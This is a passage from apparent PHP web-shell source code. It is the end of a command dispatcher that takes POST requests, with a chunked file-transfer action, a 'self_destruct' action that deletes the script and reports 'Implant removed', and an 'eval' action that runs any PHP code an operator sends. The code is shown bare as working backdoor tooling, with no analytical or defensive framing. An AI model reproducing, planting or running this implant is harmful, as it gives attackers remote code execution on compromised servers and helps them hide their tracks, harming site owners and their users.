            intval($_POST['offset'] ?? 0),
            intval($_POST['chunk_size'] ?? 1048576)
        ));
        break;

    case 'self_destruct':
        $file = __FILE__;
        if (file_exists($file)) unlink($file);
        echo json_encode(['status' => 'ok', 'message' => 'Implant removed']);
        break;

    case 'eval':
        $code = $_POST['code'] ?? '';
        try { ob_start(); eval($code); $output = ob_get_clean(); echo json_encode(['status' => 'ok', 'output' => $output]); }
        catch (Throwable $e) { echo json_encode(['status' => 'error', 'message' => $e->getMessage()]); }
        break;

    default:
        echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
}
